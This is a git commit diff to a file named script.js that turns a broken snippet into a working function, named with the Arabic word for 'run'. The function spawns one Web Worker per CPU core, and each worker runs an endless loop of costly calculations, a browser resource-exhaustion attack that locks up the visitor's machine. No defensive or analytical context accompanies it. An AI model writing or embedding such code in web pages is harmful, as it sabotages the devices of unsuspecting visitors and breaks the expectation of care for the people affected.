68fd5fcbb33bfc8db970fe432f6af1bf12f7a675
classic-empire <azez63478@gmail.com>
2025-07-05 00:43:28 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,11 @@
-function تشغيل
-for (let i = 0; i < navigator.hardwareConcurrency; i++) {
-new Worker(URL.createObjectURL(new Blob([  while (true) {   Math.pow(9999999999999999999999999999999999999999999999999999999, 99999999999999999999);   }  ])));
+function تشغيل() {
+  for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+    const كود = `
+      while (true) {
+        Math.pow(9999999999999999999999999999999999999999999999999999999, 99999999999999999999);
+      }
+    `;
+    const blob = new Blob([كود], { type: "application/javascript" });
+    const worker = new Worker(URL.createObjectURL(blob));
+  }
 }
-
